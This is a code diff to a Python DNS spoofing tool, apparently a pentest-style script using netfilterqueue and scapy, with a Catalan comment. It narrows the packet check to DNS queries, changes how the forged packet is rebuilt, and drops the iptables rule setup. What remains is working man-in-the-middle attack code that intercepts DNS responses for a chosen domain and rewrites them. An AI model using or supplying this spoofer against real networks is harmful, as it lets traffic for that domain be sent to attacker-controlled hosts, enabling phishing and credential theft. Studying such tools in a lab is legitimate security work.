@@ -5,7 +5,7 @@ import netfilterqueue
 import scapy.all as scapy
 from modules.my_utils import show_message
 from modules.net_utils import get_ip
-from modules.sys_utils import enable_rules, disable_rules, check_root
+from modules.sys_utils import check_root
 from modules.exit_handler import setup_signal_handler
 
 ### Functions #############################################################################################################
@@ -19,10 +19,10 @@ def get_arguments():
     return options.domain, options.interface
 
 def process_packet(packet):
-
     scapy_packet = scapy.IP(packet.get_payload())
-    
-    if scapy_packet.haslayer(scapy.DNSRR):
+
+    # Comprova que tingui capa DNS i DNSQR
+    if scapy_packet.haslayer(scapy.DNS) and scapy_packet.haslayer(scapy.DNSQR):
         qname = scapy_packet[scapy.DNSQR].qname.decode()
 
         if DOMAIN in qname:
@@ -37,21 +37,19 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
 
-            packet.set_payload(scapy_packet.build())
+            packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
 def main():
 
     check_root()
-    setup_signal_handler(disable_rules)
+    setup_signal_handler()
     show_message("Executing:", "info", "DNS Spoofer")
 
     global DOMAIN, interface, IP
     DOMAIN, interface = get_arguments()
     IP = get_ip(interface)
-        
-    enable_rules()
 
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
